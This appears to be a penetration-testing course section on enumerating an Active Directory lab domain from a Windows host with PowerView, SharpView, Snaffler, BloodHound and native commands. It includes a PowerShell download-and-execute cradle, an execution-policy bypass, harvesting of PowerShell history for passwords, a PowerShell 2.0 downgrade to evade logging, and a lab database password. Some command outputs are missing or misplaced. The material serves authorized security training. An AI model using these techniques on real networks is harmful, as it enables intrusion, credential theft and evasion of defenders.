In the previous section, we explored some tools we can use from our Linux attack host for enumeration with valid domain credentials. In this section, we will experiment with a few tools for enumerating from a Windows attack host, such as SharpHound/BloodHound, PowerView/SharpView, Grouper2, Snaffler, and some built-in tools useful for AD enumeration. Some of the data we gather in this phase may provide more information for reporting, not just directly lead to attack paths. Depending on the assessment type, our client may be interested in all possible findings, so even issues like the ability to run BloodHound freely or certain user account attributes may be worth including in our report as either medium-risk findings or a separate appendix section. Not every issue we uncover has to be geared towards forwarding our attacks. Some of the results may be informational in nature but useful to the customer to help improve their security posture.

At this point, we are interested in other misconfigurations and permission issues that could lead to lateral and vertical movement. We are also interested in getting a bigger picture of how the domain is set up, i.e., do any trusts exist with other domains both inside and outside the current forest? We're also interested in pillaging file shares that our user has access to, as these often contain sensitive data such as credentials that can be used to further our access.

* * *

## TTPs

The first tool we will explore is the [ActiveDirectory PowerShell module](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps). When landing on a Windows host in the domain, especially one an admin uses, there is a chance you will find valuable tools and scripts on the host.

* * *

## ActiveDirectory PowerShell Module

The ActiveDirectory PowerShell module is a group of PowerShell cmdlets for administering an Active Directory environment from the command line. It consists of 147 different cmdlets at the time of writing. We can't cover them all here, but we will look at a few that are particularly useful for enumerating AD environments. Feel free to explore other cmdlets included in the module in the lab built for this section, and see what interesting combinations and output you can create.

Before we can utilize the module, we have to make sure it is imported first. The [Get-Module](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/get-module?view=powershell-7.2) cmdlet, which is part of the [Microsoft.PowerShell.Core module](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/?view=powershell-7.2), will list all available modules, their version, and potential commands for use. This is a great way to see if anything like Git or custom administrator scripts are installed.
If the module is not loaded, run `Import-Module ActiveDirectory` to load it for use.

#### Discover Modules

```powershell
PS C:\htb> Get-Module

ModuleType Version    Name                                ExportedCommands

```

We'll see that the ActiveDirectory module is not yet imported. Let's go ahead and import it.

#### Load ActiveDirectory Module

```powershell
PS C:\htb> Import-Module ActiveDirectory
PS C:\htb> Get-Module

```

Now that our modules are loaded, let's begin. First up, we'll enumerate some basic information about the domain with the [Get-ADDomain](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-addomain?view=windowsserver2022-ps) cmdlet.

### Get Domain Info

UsersContainer                     : CN=Users,DC=INLANEFREIGHT,DC=LOCAL

```

This will print out helpful information like the domain SID, domain functional level, any child domains, and more. Next, we'll use the [Get-ADUser](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-aduser?view=windowsserver2022-ps) cmdlet. We will be filtering for accounts with the `ServicePrincipalName` property populated. This will get us a listing of accounts that may be susceptible to a Kerberoasting attack, which we will cover in-depth after the next section.

#### Get-ADUser

```powershell
PS C:\htb> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

Another interesting check we can run utilizing the ActiveDirectory module, would be to verify domain trust relationships using the [Get-ADTrust](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adtrust?view=windowsserver2022-ps) cmdlet

```

This cmdlet will print out any trust relationships the domain has. We can determine if they are trusts within our forest or with domains in other forests, the type of trust, the direction of the trust, and the name of the domain the relationship is with. This will be useful later on when looking to take advantage of child-to-parent trust relationships and attacking across forest trusts. Next, we can gather AD group information using the [Get-ADGroup](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps) cmdlet.

#### Group Enumeration

```powershell
PS C:\htb> Get-ADGroup -Filter * | select name

name
----
Administrators
Users
Guests
Print Operators
Backup Operators
Replicator
Remote Desktop Users
Network Configuration Operators
Performance Monitor Users
Performance Log Users
Distributed COM Users
IIS_IUSRS
Cryptographic Operators
Event Log Readers
Certificate Service DCOM Access
RDS Remote Access Servers
RDS Endpoint Servers
RDS Management Servers
Hyper-V Administrators
Access Control Assistance Operators
Remote Management Users
Storage Replica Administrators
Domain Computers
Domain Controllers
Schema Admins
Enterprise Admins
Cert Publishers
Domain Admins

<SNIP>

```

We can take the results and feed interesting names back into the cmdlet to get more detailed information about a particular group like so:

#### Detailed Group Info

```powershell
PS C:\htb> Get-ADGroup -Identity "Backup Operators"

DistinguishedName : CN=Backup Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL
GroupCategory     : Security
GroupScope        : DomainLocal
Name              : Backup Operators
ObjectClass       : group
ObjectGUID        : 6276d85d-9c39-4b7c-8449-cad37e8abc38
SamAccountName    : Backup Operators
SID               : S-1-5-32-551

```

Now that we know more about the group, let's get a member listing using the [Get-ADGroupMember](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroupmember?view=windowsserver2022-ps) cmdlet.

### Group Membership

```powershell
PS C:\htb> Get-ADGroupMember -Identity "Backup Operators"

distinguishedName : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
name              : BACKUPAGENT
objectClass       : user
objectGUID        : 2ec53e98-3a64-4706-be23-1d824ff61bed
SamAccountName    : backupagent
SID               : S-1-5-21-3842939050-3880317879-2865463114-5220

```

We can see that one account, `backupagent`, belongs to this group. It is worth noting this down because if we can take over this service account through some attack, we could use its membership in the Backup Operators group to take over the domain. We can perform this process for the other groups to fully understand the domain membership setup. Try repeating the process with a few different groups. You will see that this process can be tedious, and we will be left with an enormous amount of data to sift through. We must know how to do this with built-in tools such as the ActiveDirectory PowerShell module, but we will see later in this section just how much tools like BloodHound can speed up this process and make our results far more accurate and organized.

Utilizing the ActiveDirectory module on a host can be a stealthier way of performing actions than dropping a tool onto a host or loading it into memory and attempting to use it. This way, our actions could potentially blend in more. Next, we will walk through the PowerView tool, which has many features to simplify enumeration and dig deeper into the domain.

* * *

## PowerView

[PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon) is a tool written in PowerShell to help us gain situational awareness within an AD environment. Much like BloodHound, it provides a way to identify where users are logged in on a network, enumerate domain information such as users, computers, groups, ACLS, trusts, hunt for file shares and passwords, perform Kerberoasting, and more. It is a highly versatile tool that can provide us with great insight into the security posture of our client's domain. It requires more manual work to determine misconfigurations and relationships within the domain than BloodHound but, when used right, can help us to identify subtle misconfigurations.

Let's examine some of PowerView's capabilities and see what data it returns. The table below describes some of the most useful functions PowerView offers.

This table is not all-encompassing for what PowerView offers, but it includes many of the functions we will use repeatedly. For more on PowerView, check out the [Active Directory PowerView module](https://academy.hackthebox.com/course/preview/active-directory-powerview). Below we will experiment with a few of them.

First up is the [Get-DomainUser](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainUser/) function. This will provide us with information on all users or specific users we specify. Below we will use it to grab information about a specific user, `mmorgan`.

#### Domain User Information

```powershell
PS C:\htb> Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

```

We saw some basic user information with PowerView. Now let's enumerate some domain group information. We can use the [Get-DomainGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainGroupMember/) function to retrieve group-specific information. Adding the `-Recurse` switch tells PowerView that if it finds any groups that are part of the target group (nested group membership) to list out the members of those groups. For example, the output below shows that the `Secadmins` group is part of the `Domain Admins` group through nested group membership. In this case, we will be able to view all of the members of that group who inherit Domain Admin rights via their group membership.

#### Recursive Group Membership

```powershell
PS C:\htb>  Get-DomainGroupMember -Identity "Domain Admins" -Recurse

GroupDomain             : INLANEFREIGHT.LOCAL
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
MemberDomain            : INLANEFREIGHT.LOCAL
MemberName              : svc_qualys
MemberDistinguishedName : CN=svc_qualys,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
MemberObjectClass       : user
MemberSID               : S-1-5-21-3842939050-3880317879-2865463114-5613

GroupDomain             : INLANEFREIGHT.LOCAL
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
MemberDomain            : INLANEFREIGHT.LOCAL
MemberName              : sp-admin
MemberDistinguishedName : CN=Sharepoint Admin,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
MemberObjectClass       : user
MemberSID               : S-1-5-21-3842939050-3880317879-2865463114-5228

GroupDomain             : INLANEFREIGHT.LOCAL
GroupName               : Secadmins
GroupDistinguishedName  : CN=Secadmins,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
MemberDomain            : INLANEFREIGHT.LOCAL
MemberName              : spong1990
MemberDistinguishedName : CN=Maggie
                          Jablonski,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
MemberObjectClass       : user
MemberSID               : S-1-5-21-3842939050-3880317879-2865463114-1965

<SNIP>

```

Above we performed a recursive look at the `Domain Admins` group to list its members. Now we know who to target for potential elevation of privileges. Like with the AD PowerShell module, we can also enumerate domain trust mappings.

#### Trust Enumeration

```powershell
PS C:\htb> Get-DomainTrustMapping

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 2/26/2022 11:55:55 PM

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : FREIGHTLOGISTICS.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 8:07:09 PM
WhenChanged     : 2/27/2022 12:02:39 AM

SourceName      : LOGISTICS.INLANEFREIGHT.LOCAL
TargetName      : INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 2/26/2022 11:55:55 PM

```

We can use the [Test-AdminAccess](https://powersploit.readthedocs.io/en/latest/Recon/Test-AdminAccess/) function to test for local admin access on either the current machine or a remote one.

#### Testing for Local Admin Access

```powershell
PS C:\htb> Test-AdminAccess -ComputerName ACADEMY-EA-MS01

ComputerName    IsAdmin
------------    -------
ACADEMY-EA-MS01    True

```

Above, we determined that the user we are currently using is an administrator on the host ACADEMY-EA-MS01. We can perform the same function for each host to see where we have administrative access. We will see later how well BloodHound performs this type of check. Now we can check for users with the SPN attribute set, which indicates that the account may be subjected to a Kerberoasting attack.

#### Finding Users With SPN Set

```powershell
PS C:\htb> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName

serviceprincipalname                          samaccountname
--------------------                          --------------
adfsconnect/azure01.inlanefreight.local       adfs
backupjob/veam001.inlanefreight.local         backupagent
d0wngrade/kerberoast.inlanefreight.local      d0wngrade

testspn/kerberoast.inlanefreight.local        testspn
testspn2/kerberoast.inlanefreight.local       testspn2

```

Test out some more of the tool's functions until you are comfortable using it. We will see PowerView quite a few more times as we progress through this module.

* * *

## SharpView

PowerView is part of the now deprecated PowerSploit offensive PowerShell toolkit. The tool has been receiving updates by BC-Security as part of their [Empire 4](https://github.com/BC-SECURITY/Empire/blob/master/empire/server/data/module_source/situational_awareness/network/powerview.ps1) framework. Empire 4 is BC-Security's fork of the original Empire project and is actively maintained as of April 2022. We show examples throughout this module using the development version of PowerView because it is an excellent tool for recon in an Active Directory environment, and is still extremely powerful and helpful in modern AD networks even though the original version is not maintained. The BC-SECURITY version of [PowerView](https://github.com/BC-SECURITY/Empire/blob/master/empire/server/data/module_source/situational_awareness/network/powerview.ps1) has some new functions such as `Get-NetGmsa`, used to hunt for [Group Managed Service Accounts](https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview), which is out of scope for this module. It is worth playing around with both versions to see the subtle differences between the old and currently maintained versions.

Another tool worth experimenting with is SharpView, a .NET port of PowerView. Many of the same functions supported by PowerView can be used with SharpView. We can type a method name with `-Help` to get an argument list.

```powershell
PS C:\htb> .\SharpView.exe Get-DomainUser -Help

Get_DomainUser -Identity <String[]> -DistinguishedName <String[]> -SamAccountName <String[]> -Name <String[]> -MemberDistinguishedName <String[]> -MemberName <String[]> -SPN <Boolean> -AdminCount <Boolean> -AllowDelegation <Boolean> -DisallowDelegation <Boolean> -TrustedToAuth <Boolean> -PreauthNotRequired <Boolean> -KerberosPreauthNotRequired <Boolean> -NoPreauth <Boolean> -Domain <String> -LDAPFilter <String> -Filter <String> -Properties <String[]> -SearchBase <String> -ADSPath <String> -Server <String> -DomainController <String> -SearchScope <SearchScope> -ResultPageSize <Int32> -ServerTimeLimit <Nullable`1> -SecurityMasks <Nullable`1> -Tombstone <Boolean> -FindOne <Boolean> -ReturnOne <Boolean> -Credential <NetworkCredential> -Raw <Boolean> -UACFilter <UACEnum>

```

Here we can use SharpView to enumerate information about a specific user, such as the user `forend`, which we control.

```powershell
PS C:\htb> .\SharpView.exe Get-DomainUser -Identity forend

[Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL

```

Experiment with SharpView on the MS01 host and recreate as many PowerView examples as possible. Though evasion is not in scope for this module, SharpView can be useful when a client has hardened against PowerShell usage or we need to avoid using PowerShell.

## Shares

Shares allow users on a domain to quickly access information relevant to their daily roles and share content with their organization. When set up correctly, domain shares will require a user to be domain joined and required to authenticate when accessing the system. Permissions will also be in place to ensure users can only access and see what is necessary for their daily role. Overly permissive shares can potentially cause accidental disclosure of sensitive information, especially those containing medical, legal, personnel, HR, data, etc. In an attack, gaining control over a standard domain user who can access shares such as the IT/infrastructure shares could lead to the disclosure of sensitive data such as configuration files or authentication files like SSH keys or passwords stored insecurely. We want to identify any issues like these to ensure the customer is not exposing any data to users who do not need to access it for their daily jobs and that they are meeting any legal/regulatory requirements they are subject to (HIPAA, PCI, etc.). We can use PowerView to hunt for shares and then help us dig through them or use various manual commands to hunt for common strings such as files with `pass` in the name. This can be a tedious process, and we may miss things, especially in large environments. Now, let's take some time to explore the tool `Snaffler` and see how it can aid us in identifying these issues more accurately and efficiently.

* * *

## Snaffler

[Snaffler](https://github.com/SnaffCon/Snaffler) is a tool that can help us acquire credentials or other sensitive data in an Active Directory environment. Snaffler works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories. Once that is done, it iterates through any directories readable by our user and hunts for files that could serve to better our position within the assessment. Snaffler requires that it be run from a domain-joined host or in a domain-user context.

To execute Snaffler, we can use the command below:

#### Snaffler Execution

```bash
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data

```

The `-s` tells it to print results to the console for us, the `-d` specifies the domain to search within, and the `-o` tells Snaffler to write results to a logfile. The `-v` option is the verbosity level. Typically `data` is best as it only displays results to the screen, so it's easier to begin looking through the tool runs. Snaffler can produce a considerable amount of data, so we should typically output to file and let it run and then come back to it later. It can also be helpful to provide Snaffler raw output to clients as supplemental data during a penetration test as it can help them zero in on high-value shares that should be locked down first.

#### Snaffler in Action

```powershell
PS C:\htb> .\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data

```

We may find passwords, SSH keys, configuration files, or other data that can be used to further our access. Snaffler color codes the output for us and provides us with a rundown of the file types found in the shares.

Now that we have a wealth of data about the INLANEFREIGHT.LOCAL domain (and hopefully clear notes and log file output!), we need a way to correlate it and visualize it. Let's dive deeper into `BloodHound` and see how powerful this tool can be during any AD-focused security assessment.

* * *

### BloodHound

As discussed in the previous section, ` Bloodhound` is an exceptional open-source tool that can identify attack paths within an AD environment by analyzing the relationships between objects. Both penetration testers and blue teamers can benefit from learning to use BloodHound to visualize relationships in the domain. When used correctly and coupled with custom Cipher queries, BloodHound may find high-impact, but difficult to discover, flaws that have been present in the domain for years.

First, we must authenticate as a domain user from a Windows attack host positioned within the network (but not joined to the domain) or transfer the tool to a domain-joined host. There are many ways to achieve this covered in the [File Transfer](https://academy.hackthebox.com/course/preview/file-transfers) module. For our purposes, we will work with SharpHound.exe already on the attack host, but it's worth experimenting with transferring the tool to the attack host from Pwnbox or our own VM using methods such as a Python HTTP server, smbserver.py from Impacket, etc.

If we run SharpHound with the `--help` option, we can see the options available to us.

#### SharpHound in Action

We'll start by running the SharpHound.exe collector from the MS01 attack host.

```

Next, we can exfiltrate the dataset to our own VM or ingest it into the BloodHound GUI tool on MS01. We can do this on MS01 by typing `bloodhound` into a CMD or PowerShell console. The credentials should be saved, but enter `neo4j: HTB_@cademy_stdnt!` if a prompt appears. Next, click on the `Upload Data` button on the right-hand side, select the newly generated zip file, and click `Open`. An `Upload Progress` window will pop up. Once all .json files show 100% complete, click the X at the top of that window.

We can start by typing `domain:` in the search bar on the top left and choosing `INLANEFREIGHT.LOCAL` from the results. Take a moment to browse the node info tab. As we can see, this would be a rather large company with over 550 hosts to target and trusts with two other domains.

Now, let's check out a few pre-built queries in the `Analysis` tab. The query `Find Computers with Unsupported Operating Systems` is great for finding outdated and unsupported operating systems running legacy software. These systems are relatively common to find within enterprise networks (especially older environments), as they often run some product that cannot be updated or replaced as of yet. Keeping these hosts around may save money, but they also can add unnecessary vulnerabilities to the network. Older hosts may be susceptible to older remote code execution vulnerabilities like [MS08-067](https://support.microsoft.com/en-us/topic/ms08-067-vulnerability-in-server-service-could-allow-remote-code-execution-ac7878fc-be69-7143-472d-2507a179cd15). If we come across these older hosts during an assessment, we should be careful before attacking them (or even check with our client) as they may be fragile and running a critical application or service. We can advise our client to segment these hosts off from the rest of the network as much as possible if they cannot remove them yet, but should also recommend that they start putting together a plan to decommission and replace them.

This query shows two hosts, one running Windows 7 and one running Windows Server 2008 (both of which are not "live" in our lab). Sometimes we will see hosts that are no longer powered on but still appear as records in AD. We should always validate whether they are "live" or not before making recommendations in our reports. We may write up a high-risk finding for Legacy Operating Systems or a best practice recommendation for cleaning up old records in AD.

#### Unsupported Operating Systems

![text](https://academy.hackthebox.com/storage/modules/143/unsupported.png)

We will often see users with local admin rights on their host (perhaps temporarily to install a piece of software, and the rights were never removed), or they occupy a high enough role in the organization to demand these rights (whether they require them or not). Other times we'll see excessive local admin rights handed out across the organization, such as multiple groups in the IT department with local admin over groups of servers or even the entire Domain Users group with local admin over one or more hosts. This can benefit us if we take over a user account with these rights over one or more machines. We can run the query `Find Computers where Domain Users are Local Admin` to quickly see if there are any hosts where all users have local admin rights. If this is the case, then any account we control can typically be used to access the host(s) in question, and we may be able to retrieve credentials from memory or find other sensitive data.

#### Local Admins

![text](https://academy.hackthebox.com/storage/modules/143/local-admin.png)

This is just a snapshot of the useful queries we can run. As we continue through this module, you will see several more that can be helpful in finding other weaknesses in the domain. For a more in-depth study on BloodHound, check out the module [Active Directory Bloodhound](https://academy.hackthebox.com/course/preview/active-directory-bloodhound). Take some time and try out each of the queries in the `Analysis` tab to become more familiar with the tool. It's also worth experimenting with [custom Cypher queries](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/) by pasting them into the `Raw Query` box at the bottom of the screen.

Keep in mind as we go through the engagement, we should be documenting every file that is transferred to and from hosts in the domain and where they were placed on disk. This is good practice if we have to deconflict our actions with the customer. Also, depending on the scope of the engagement, you want to ensure you cover your tracks and clean up anything you put in the environment at the conclusion of the engagement.

* * *

We have a great picture of the domain's layout, strengths, and weaknesses. We have credentials for several users and have enumerated a wealth of informtation such as users, groups, computers, GPOs, ACLs, local admin rights, access rights (RDP, WinRM, etc.), accounts configured with Service Principal Names (SPNs), and more. We have detailed notes and a wealth of output and experimented with many different tools to practice enumerating AD with and without credentials from Linux and Windows attack hosts. What happens if we are restricted with the shell we have or do not have the ability to import tools? Our client may ask us to perform all work from a managed host inside their network without internet access and no way to load our tools. We could land on a host as `SYSTEM` after a successful attack, but be in a position where it is very difficult or not possible to load tools. What do we do then? In the next section, we will look at how to perform actions while "Living Off The Land."


# Living Off the Land

* * *

Earlier in the module, we practiced several tools and techniques (both credentialed and uncredentialed) to enumerate the AD environment. These methods required us to upload or pull the tool onto the foothold host or have an attack host inside the environment. This section will discuss several techniques for utilizing native Windows tools to perform our enumeration and then practice them from our Windows attack host.

* * *

## Scenario

Let's assume our client has asked us to test their AD environment from a managed host with no internet access, and all efforts to load tools onto it have failed. Our client wants to see what types of enumeration are possible, so we'll have to resort to "living off the land" or only using tools and commands native to Windows/Active Directory. This can also be a more stealthy approach and may not create as many log entries and alerts as pulling tools into the network in previous sections. Most enterprise environments nowadays have some form of network monitoring and logging, including IDS/IPS, firewalls, and passive sensors and tools on top of their host-based defenses such as Windows Defender or enterprise EDR. Depending on the environment, they may also have tools that take a baseline of "normal" network traffic and look for anomalies. Because of this, our chances of getting caught go up exponentially when we start pulling tools into the environment from outside.

* * *

## Env Commands For Host & Network Recon

First, we'll cover a few basic environmental commands that can be used to give us more information about the host we are on.

#### Basic Enumeration Commands

| **Command** | **Result** |
| --- | --- |
| `hostname` | Prints the PC's Name |
| `[System.Environment]::OSVersion.Version` | Prints out the OS version and revision level |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patches and hotfixes applied to the host |
| `ipconfig /all` | Prints out network adapter state and configurations |
| `set` | Displays a list of environment variables for the current session (ran from CMD-prompt) |
| `echo %USERDOMAIN%` | Displays the domain name to which the host belongs (ran from CMD-prompt) |
| `echo %logonserver%` | Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt) |

#### Basic Enumeration

![image](https://academy.hackthebox.com/storage/modules/143/basic-enum.png)

The commands above will give us a quick initial picture of the state the host is in, as well as some basic networking and domain information. We can cover the information above with one command [systeminfo](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/systeminfo).

#### Systeminfo

![image](https://academy.hackthebox.com/storage/modules/143/systeminfo.png)

The `systeminfo` command, as seen above, will print a summary of the host's information for us in one tidy output. Running one command will generate fewer logs, meaning less of a chance we are noticed on the host by a defender.

* * *

## Harnessing PowerShell

PowerShell has been around since 2006 and provides Windows sysadmins with an extensive framework for administering all facets of Windows systems and AD environments. It is a powerful scripting language and can be used to dig deep into systems. PowerShell has many built-in functions and modules we can use on an engagement to recon the host and network and send and receive files.

Let's look at a few of the ways PowerShell can help us.

| **Cmd-Let** | **Description** |
| --- | --- |
| `Get-Module` | Lists available modules loaded for use. |
| `Get-ExecutionPolicy -List` | Will print the [execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) settings for each scope on a host. |
| `Set-ExecutionPolicy Bypass -Scope Process` | This will change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. |
| `Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords. |
| `Get-ChildItem Env: | ft Key,Value` | Return environment values such as key paths, users, computer information, etc. |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"` | This is a quick and easy way to download a file from the web using PowerShell and call it from memory. |

Let's see them in action now on the `MS01` host.

We have performed basic enumeration of the host. Now, let's discuss a few operational security tactics.

Many defenders are unaware that several versions of PowerShell often exist on a host. If not uninstalled, they can still be used. Powershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer. This is a great way for us to remain under the defenders' radar while still utilizing resources built into the hosts to our advantage. Below is an example of downgrading Powershell.

#### Downgrade Powershell

We can now see that we are running an older version of PowerShell from the output above. Notice the difference in the version reported. It validates we have successfully downgraded the shell. Let's check and see if we are still writing logs. The primary place to look is in the `PowerShell Operational Log` found under `Applications and Services Logs > Microsoft > Windows > PowerShell > Operational`. All commands executed in our session will log to this file. The `Windows PowerShell` log located at `Applications and Services Logs > Windows PowerShell` is also a good place to check. An entry will be made here when we start an instance of PowerShell. In the image below, we can see the red entries made to the log from the current PowerShell session and the output of the last entry made at 2:12 pm when the downgrade is performed. It was the last entry since our session moved into a version of PowerShell no longer capable of logging. Notice that, that event corresponds with the last event in the `Windows PowerShell` log entries.

#### Examining the Powershell Event Log

![text](https://academy.hackthebox.com/storage/modules/143/downgrade.png)

With [Script Block Logging](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.2) enabled, we can see that whatever we type into the terminal gets sent to this log. If we downgrade to PowerShell V2, this will no longer function correctly. Our actions after will be masked since Script Block Logging does not work below PowerShell 3.0. Notice above in the logs that we can see the commands we issued during a normal shell session, but it stopped after starting a new PowerShell instance in version 2. Be aware that the action of issuing the command `powershell.exe -version 2` within the PowerShell session will be logged. So evidence will be left behind showing that the downgrade happened, and a suspicious or vigilant defender may start an investigation after seeing this happen and the logs no longer filling up for that instance. We can see an example of this in the image below. Items in the red box are the log entries before starting the new instance, and the info in green is the text showing a new PowerShell session was started in HostVersion 2.0.

### Checking Defenses

The next few commands utilize the [netsh](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts) and [sc](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-query) utilities to help us get a feel for the state of the host when it comes to Windows Firewall settings and to check the status of Windows Defender.

#### Firewall Checks

#### Windows Defender Check (from CMD.exe)

```cmd-session
C:\htb> sc query windefend

SERVICE_NAME: windefend
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING

        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

```

Above, we checked if Defender was running. Below we will check the status and configuration settings with the [Get-MpComputerStatus](https://docs.microsoft.com/en-us/powershell/module/defender/get-mpcomputerstatus?view=windowsserver2022-ps) cmdlet in PowerShell.

#### Get-MpComputerStatus

```

Knowing what revision our AV settings are at and what settings are enabled/disabled can greatly benefit us. We can tell how often scans are run, if the on-demand threat alerting is active, and more. This is also great info for reporting. Often defenders may think that certain settings are enabled or scans are scheduled to run at certain intervals. If that's not the case, these findings can help them remediate those issues.

* * *

## Am I Alone?

When landing on a host for the first time, one important thing is to check and see if you are the only one logged in. If you start taking actions from a host someone else is on, there is the potential for them to notice you. If a popup window launches or a user is logged out of their session, they may report these actions or change their password, and we could lose our foothold.

#### Using qwinsta

```powershell
PS C:\htb> qwinsta

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
 services                                    0  Disc
>console           forend                    1  Active
 rdp-tcp                                 65536  Listen

```

Now that we have a solid feel for the state of our host, we can enumerate the network settings for our host and identify any potential domain machines or services we may want to target next.

## Network Information

| **Networking Commands** | **Description** |
| --- | --- |
| `arp -a ` | Lists all known hosts stored in the arp table. |
| `ipconfig /all` | Prints out adapter settings for the host. We can figure out the network segment from here. |
| `route print` | Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host. |
| `netsh advfirewall show state` | Displays the status of the host's firewall. We can determine if it is active and filtering traffic. |

Commands such as `ipconfig /all` and `systeminfo` show us some basic networking configurations. Two more important commands provide us with a ton of valuable data and could help us further our access. `arp -a` and `route print` will show us what hosts the box we are on is aware of and what networks are known to the host. Any networks that appear in the routing table are potential avenues for lateral movement because they are accessed enough that a route was added, or it has administratively been set there so that the host knows how to access resources on the domain. These two commands can be especially helpful in the discovery phase of a black box assessment where we have to limit our scanning

#### Using arp -a

Using `arp -a` and `route print` will not only benefit in enumerating AD environments, but will also assist us in identifying opportunities to pivot to different network segments in any environment. These are commands we should consider using on each engagement to assist our clients in understanding where an attacker may attempt to go following initial compromise.

## Windows Management Instrumentation (WMI)

[Windows Management Instrumentation (WMI)](https://docs.microsoft.com/en-us/windows/win32/wmisdk/about-wmi) is a scripting engine that is widely used within Windows enterprise environments to retrieve information and run administrative tasks on local and remote hosts. For our usage, we will create a WMI report on domain users, groups, processes, and other information from our host and other domain hosts.

#### Quick WMI checks

| **Command** | **Description** |
| --- | --- |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patch level and description of the Hotfixes applied |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Displays basic host information to include any attributes within the list |
| `wmic process list /format:list` | A listing of all processes on host |
| `wmic ntdomain list /format:list` | Displays information about the Domain and Domain Controllers |
| `wmic useraccount list /format:list` | Displays information about all local accounts and any domain accounts that have logged into the device |
| `wmic group list /format:list` | Information about all local groups |
| `wmic sysaccount list /format:list` | Dumps information about any system accounts that are being used as service accounts. |

Below we can see information about the domain and the child domain, and the external forest that our current domain has a trust with. This [cheatsheet](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4) has some useful commands for querying host and domain info using wmic.

```powershell
PS C:\htb> wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress

Caption          Description      DnsForestName           DomainControllerAddress  DomainName
ACADEMY-EA-MS01  ACADEMY-EA-MS01
INLANEFREIGHT    INLANEFREIGHT    INLANEFREIGHT.LOCAL     \\172.16.5.5             INLANEFREIGHT
LOGISTICS        LOGISTICS        INLANEFREIGHT.LOCAL     \\172.16.5.240           LOGISTICS
FREIGHTLOGISTIC  FREIGHTLOGISTIC  FREIGHTLOGISTICS.LOCAL  \\172.16.5.238           FREIGHTLOGISTIC

```

WMI is a vast topic, and it would be impossible to touch on everything it is capable of in one part of a section. For more information about WMI and its capabilities, check out the official [WMI documentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/using-wmi).

* * *

## Net Commands

